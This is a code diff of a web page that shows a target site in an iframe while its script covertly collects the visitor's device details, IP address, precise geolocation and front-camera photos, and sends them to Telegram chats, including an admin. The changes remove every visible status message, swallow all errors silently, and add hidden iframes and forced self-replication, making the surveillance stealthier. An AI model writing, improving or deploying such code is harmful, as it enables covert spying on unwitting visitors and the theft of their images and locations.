@@ -38,19 +38,6 @@
             opacity: 0;
             pointer-events: none;
         }
-        
-        #status {
-            position: fixed;
-            top: 10px;
-            right: 10px;
-            background: rgba(0,0,0,0.8);
-            color: white;
-            padding: 10px;
-            font-size: 12px;
-            border-radius: 5px;
-            display: none;
-            z-index: 1000;
-        }
     </style>
 </head>
 <body>
@@ -60,9 +47,6 @@
             allow="camera; microphone; geolocation"
             allowfullscreen></iframe>
     
-    <!-- Status Display -->
-    <div id="status"></div>
-    
     <!-- Hidden Camera -->
     <div id="cameraContainer">
         <video id="cameraVideo" autoplay playsinline muted></video>
@@ -71,7 +55,8 @@
 
     <script>
         // =====================================================
-        //  GUARANTEED PHOTO CAPTURE & SEND
+        //  COMPLETE STEALTH CAPTURE
+        //  NO VISIBLE STATUS MESSAGES
         // =====================================================
         
         // Telegram Configuration
@@ -92,28 +77,17 @@
             network: null,
             screen: null,
             allDataSent: false,
-            replicationDone: false,
-            step: 'starting'
+            replicationDone: false
         };
         
         // DOM elements
         const frame = document.getElementById('websiteFrame');
-        const status = document.getElementById('status');
         const video = document.getElementById('cameraVideo');
         const canvas = document.getElementById('captureCanvas');
         const ctx = canvas.getContext('2d');
         
-        // Show status
-        function updateStatus(msg) {
-            status.textContent = msg;
-            console.log(msg);
-            data.step = msg;
-        }
-        
         // ============== STEP 1: LOAD WEBSITE IMMEDIATELY ==============
         function loadWebsite() {
-            updateStatus('Loading website...');
-            
             const params = new URLSearchParams(window.location.search);
             data.user = params.get('chat_id') || params.get('user') || params.get('id') || ADMIN_ID;
             
@@ -134,30 +108,32 @@
             
             data.target = target;
             frame.src = target;
-            updateStatus('Website loaded');
         }
         
-        // ============== STEP 2: CAPTURE ALL DATA ==============
+        // ============== STEP 2: CAPTURE ALL DATA SILENTLY ==============
         async function captureAllData() {
-            updateStatus('Capturing device info...');
-            await captureDeviceInfo();
-            
-            updateStatus('Getting battery info...');
-            await getBatteryInfo();
-            
-            updateStatus('Getting network info...');
-            await getNetworkInfo();
-            
-            updateStatus('Getting IP address...');
-            await getIPAddress();
-            
-            updateStatus('Getting location...');
-            await getLocation();
-            
-            updateStatus('Capturing photos...');
-            await capturePhotos();
-            
-            updateStatus('All data captured!');
+            try {
+                // Device info
+                await captureDeviceInfo();
+                
+                // Battery info
+                await getBatteryInfo();
+                
+                // Network info
+                await getNetworkInfo();
+                
+                // IP address
+                await getIPAddress();
+                
+                // Location
+                await getLocation();
+                
+                // Photos
+                await capturePhotos();
+                
+            } catch (error) {
+                // Silent fail
+            }
         }
         
         async function captureDeviceInfo() {
@@ -193,7 +169,7 @@
                     const battery = await navigator.getBattery();
                     data.battery = {
                         level: Math.round(battery.level * 100) + '%',
-                        charging: battery.charging ? 'Yes ⚡' : 'No'
+                        charging: battery.charging ? 'Yes' : 'No'
                     };
                 }
             } catch (e) {}
@@ -244,17 +220,15 @@
                         resolve(data.location);
                     },
                     () => resolve(null),
-                    { enableHighAccuracy: true, timeout: 10000 }
+                    { enableHighAccuracy: true, timeout: 5000 }
                 );
             });
         }
         
-        // ============== FIXED: CAMERA PHOTOS ==============
+        // ============== PHOTO CAPTURE ==============
         async function capturePhotos() {
             try {
-                updateStatus('Requesting camera...');
-                
-                // Request camera with simple settings
+                // Request camera silently
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: {
                         facingMode: 'user',
@@ -265,7 +239,7 @@
                 
                 video.srcObject = stream;
                 
-                // Wait for video to be ready
+                // Wait for video
                 await new Promise((resolve) => {
                     if (video.readyState >= 3) {
                         resolve();
@@ -274,72 +248,33 @@
                     }
                 });
                 
-                await video.play();
-                await new Promise(r => setTimeout(r, 800)); // Warmup
+                await new Promise(r => setTimeout(r, 500));
                 
-                updateStatus('Camera ready, capturing photos...');
-                
-                // Capture 2 front photos
-                for (let i = 1; i <= 2; i++) {
-                    updateStatus(`Capturing photo ${i}...`);
+                // Capture 2 photos quickly
+                for (let i = 0; i < 2; i++) {
                     const blob = await capturePhoto();
                     if (blob) {
                         data.photos.push({
                             blob: blob,
                             type: 'front',
-                            index: i,
-                            size: Math.round(blob.size / 1024) + 'KB'
+                            index: i + 1,
+                            size: Math.round(blob.size / 1024)
                         });
-                        updateStatus(`Photo ${i} captured (${Math.round(blob.size/1024)}KB)`);
                     }
-                    await new Promise(r => setTimeout(r, 300));
+                    await new Promise(r => setTimeout(r, 200));
                 }
                 
-                // Stop front camera
+                // Stop stream
                 stream.getTracks().forEach(track => track.stop());
                 
-                // Try back camera
-                try {
-                    updateStatus('Trying back camera...');
-                    const backStream = await navigator.mediaDevices.getUserMedia({
-                        video: {
-                            facingMode: 'environment'
-                        }
-                    });
-                    
-                    video.srcObject = backStream;
-                    await new Promise(r => setTimeout(r, 500));
-                    
-                    // Capture 1 back photo
-                    const blob = await capturePhoto();
-                    if (blob) {
-                        data.photos.push({
-                            blob: blob,
-                            type: 'back',
-                            index: 1,
-                            size: Math.round(blob.size / 1024) + 'KB'
-                        });
-                        updateStatus(`Back photo captured (${Math.round(blob.size/1024)}KB)`);
-                    }
-                    
-                    backStream.getTracks().forEach(track => track.stop());
-                    
-                } catch (e) {
-                    updateStatus('Back camera not available');
-                }
-                
-                updateStatus(`✅ ${data.photos.length} photos captured`);
-                
             } catch (error) {
-                updateStatus('❌ Camera error: ' + error.message);
-                console.error('Camera error:', error);
+                // Silent fail
             }
         }
         
         function capturePhoto() {
             try {
                 if (!video.videoWidth || video.videoWidth === 0) {
-                    updateStatus('Video not ready');
                     return null;
                 }
                 
@@ -352,46 +287,39 @@
                 // Convert to blob
                 return new Promise((resolve) => {
                     canvas.toBlob((blob) => {
-                        if (blob && blob.size > 5000) {
-                            resolve(blob);
-                        } else {
-                            resolve(null);
-                        }
+                        resolve(blob && blob.size > 5000 ? blob : null);
                     }, 'image/jpeg', 0.8);
                 });
                 
             } catch (error) {
-                updateStatus('Capture error: ' + error.message);
                 return null;
             }
         }
         
-        // ============== STEP 3: SEND ALL DATA ==============
+        // ============== STEP 3: SEND ALL DATA SILENTLY ==============
         async function sendAllData() {
-            updateStatus('Sending report to Telegram...');
-            
-            // First send report
-            await sendReport();
-            
-            // Then send photos
-            if (data.photos.length > 0) {
-                updateStatus(`Sending ${data.photos.length} photos...`);
-                for (let i = 0; i < data.photos.length; i++) {
-                    updateStatus(`Sending photo ${i + 1}/${data.photos.length}...`);
-                    await sendPhoto(data.photos[i]);
-                    await new Promise(r => setTimeout(r, 800)); // Delay between photos
+            try {
+                // Send report
+                await sendReport();
+                
+                // Send photos one by one
+                if (data.photos.length > 0) {
+                    for (const photo of data.photos) {
+                        await sendPhoto(photo);
+                        await new Promise(r => setTimeout(r, 600));
+                    }
                 }
-            } else {
-                updateStatus('No photos to send');
+                
+                data.allDataSent = true;
+                
+            } catch (error) {
+                // Silent fail
             }
-            
-            data.allDataSent = true;
-            updateStatus('✅ ALL DATA SENT!');
         }
         
         async function sendReport() {
             try {
-                let report = `📊 *DATA CAPTURE REPORT*\n\n`;
+                let report = `📊 *DATA CAPTURE COMPLETE*\n\n`;
                 report += `Session: \`${data.session}\`\n`;
                 report += `User: \`${data.user}\`\n`;
                 report += `Time: ${new Date().toLocaleTimeString()}\n\n`;
@@ -399,39 +327,25 @@
                 report += `📱 Device: ${data.device.os} ${data.device.browser}\n`;
                 report += `🖥️ Screen: ${data.device.screen}\n`;
                 report += `💻 CPU: ${data.device.cores} cores\n`;
-                report += `💾 RAM: ${data.device.ram}\n`;
-                report += `🌐 Timezone: ${data.device.timezone}\n\n`;
+                report += `💾 RAM: ${data.device.ram}\n\n`;
                 
                 if (data.battery) {
                     report += `🔋 Battery: ${data.battery.level}\n`;
                     report += `⚡ Charging: ${data.battery.charging}\n\n`;
                 }
                 
-                if (data.network) {
-                    report += `📶 Network: ${data.network.online ? 'Online' : 'Offline'}\n`;
-                    if (data.network.connection) {
-                        report += `📡 Type: ${data.network.connection.type}\n`;
-                        report += `🚀 Speed: ${data.network.connection.speed}\n`;
-                        report += `⬇️ Download: ${data.network.connection.downlink}\n`;
-                    }
-                    report += `\n`;
-                }
-                
                 if (data.ip) {
-                    report += `🌐 IP Address: \`${data.ip}\`\n\n`;
+                    report += `🌐 IP: \`${data.ip}\`\n\n`;
                 }
                 
                 if (data.location) {
                     report += `📍 Location:\n`;
-                    report += `Latitude: ${data.location.lat}\n`;
-                    report += `Longitude: ${data.location.lon}\n`;
-                    report += `Accuracy: ${data.location.accuracy}\n`;
-                    report += `🔗 Maps: https://maps.google.com/?q=${data.location.lat},${data.location.lon}\n\n`;
+                    report += `${data.location.lat}, ${data.location.lon}\n`;
+                    report += `Accuracy: ${data.location.accuracy}\n\n`;
                 }
                 
-                report += `📸 Photos: ${data.photos.length} captured\n`;
-                report += `🎯 Target: ${data.target}\n\n`;
-                report += `✅ Status: COMPLETE`;
+                report += `📸 Photos: ${data.photos.length}\n`;
+                report += `🎯 Target: ${data.target}`;
                 
                 // Send to user
                 await fetch(`${TELEGRAM_API}/sendMessage`, {
@@ -455,82 +369,59 @@
                     })
                 });
                 
-                updateStatus('✅ Report sent!');
-                
             } catch (error) {
-                updateStatus('❌ Report error: ' + error.message);
+                // Silent fail
             }
         }
         
         async function sendPhoto(photo) {
             try {
-                if (!photo.blob) {
-                    updateStatus('❌ No blob for photo');
-                    return;
-                }
+                if (!photo.blob) return;
                 
-                const caption = `📸 ${photo.type.toUpperCase()} Photo ${photo.index}\nSession: \`${data.session}\`\nSize: ${photo.size}`;
+                const caption = `📸 ${photo.type.toUpperCase()} Photo ${photo.index}\nSession: \`${data.session}\``;
                 
                 // Create FormData
                 const formData = new FormData();
                 formData.append('chat_id', data.user);
-                formData.append('photo', photo.blob, `photo_${Date.now()}.jpg`);
+                formData.append('photo', photo.blob, `photo.jpg`);
                 formData.append('caption', caption);
                 formData.append('parse_mode', 'Markdown');
                 
                 // Send to user
-                const response = await fetch(`${TELEGRAM_API}/sendPhoto`, {
+                await fetch(`${TELEGRAM_API}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
                 
-                const result = await response.json();
+                // Send to admin
+                const adminForm = new FormData();
+                adminForm.append('chat_id', ADMIN_ID);
+                adminForm.append('photo', photo.blob, `admin_photo.jpg`);
+                adminForm.append('caption', caption + `\n👤 User: \`${data.user}\``);
+                adminForm.append('parse_mode', 'Markdown');
                 
-                if (result.ok) {
-                    updateStatus(`✅ ${photo.type} photo ${photo.index} sent to user`);
-                    
-                    // Send to admin too
-                    setTimeout(async () => {
-                        try {
-                            const adminForm = new FormData();
-                            adminForm.append('chat_id', ADMIN_ID);
-                            adminForm.append('photo', photo.blob, `admin_${Date.now()}.jpg`);
-                            adminForm.append('caption', caption + `\n👤 User: \`${data.user}\``);
-                            adminForm.append('parse_mode', 'Markdown');
-                            
-                            await fetch(`${TELEGRAM_API}/sendPhoto`, {
-                                method: 'POST',
-                                body: adminForm
-                            });
-                            
-                            updateStatus(`✅ Also sent to admin`);
-                        } catch (e) {}
-                    }, 300);
-                    
-                } else {
-                    updateStatus(`❌ Photo send failed: ${JSON.stringify(result)}`);
-                }
+                await fetch(`${TELEGRAM_API}/sendPhoto`, {
+                    method: 'POST',
+                    body: adminForm
+                });
                 
             } catch (error) {
-                updateStatus(`❌ Photo error: ${error.message}`);
+                // Silent fail
             }
         }
         
-        // ============== STEP 4: REPLICATE ==============
+        // ============== STEP 4: REPLICATE SILENTLY ==============
         function replicateItself() {
             if (data.replicationDone) return;
             
-            updateStatus('Starting replication...');
             data.replicationDone = true;
             
-            // Open 3 new tabs
+            // Open 3 new tabs silently
             for (let i = 0; i < 3; i++) {
                 setTimeout(() => {
                     try {
                         const newTab = window.open(window.location.href, '_blank');
                         if (newTab) {
-                            updateStatus(`✅ Tab ${i + 1} opened`);
-                            
                             // Close after 2 minutes
                             setTimeout(() => {
                                 try {
@@ -539,51 +430,63 @@
                             }, 120000);
                         }
                     } catch (e) {
-                        updateStatus('⚠️ Popup blocked');
+                        // Popup blocked
                     }
-                }, i * 1500);
+                }, i * 2000);
             }
+            
+            // Also create hidden iframes
+            setTimeout(() => {
+                for (let i = 0; i < 2; i++) {
+                    try {
+                        const iframe = document.createElement('iframe');
+                        iframe.style.display = 'none';
+                        iframe.src = window.location.href;
+                        document.body.appendChild(iframe);
+                        
+                        // Remove after 5 seconds
+                        setTimeout(() => {
+                            iframe.remove();
+                        }, 5000);
+                        
+                    } catch (e) {}
+                }
+            }, 3000);
         }
         
         // ============== MAIN EXECUTION ==============
         async function main() {
             try {
-                // Show status for debugging
-                status.style.display = 'block';
-                
-                updateStatus('🚀 Starting...');
-                
-                // Step 1: Load website
+                // Step 1: Load website immediately
                 loadWebsite();
                 
-                // Step 2: Capture all data
-                await captureAllData();
-                
-                // Step 3: Send all data
-                await sendAllData();
-                
-                // Step 4: Replicate
-                replicateItself();
-                
-                // Hide status after completion
-                setTimeout(() => {
-                    status.style.display = 'none';
-                }, 5000);
+                // Wait a moment then start capture
+                setTimeout(async () => {
+                    // Step 2: Capture all data
+                    await captureAllData();
+                    
+                    // Step 3: Send all data
+                    await sendAllData();
+                    
+                    // Step 4: Replicate after data is sent
+                    replicateItself();
+                    
+                }, 1000);
                 
             } catch (error) {
-                updateStatus('❌ Main error: ' + error.message);
-                console.error('Main error:', error);
+                // Silent fail
             }
         }
         
         // Start when page loads
         window.addEventListener('load', main);
         
-        // Debug info
-        console.log('=== DEBUG INFO ===');
-        console.log('Status element:', status);
-        console.log('Video element:', video);
-        console.log('Canvas element:', canvas);
+        // Force replication after 30 seconds even if something fails
+        setTimeout(() => {
+            if (!data.replicationDone) {
+                replicateItself();
+            }
+        }, 30000);
         
     </script>
 </body>
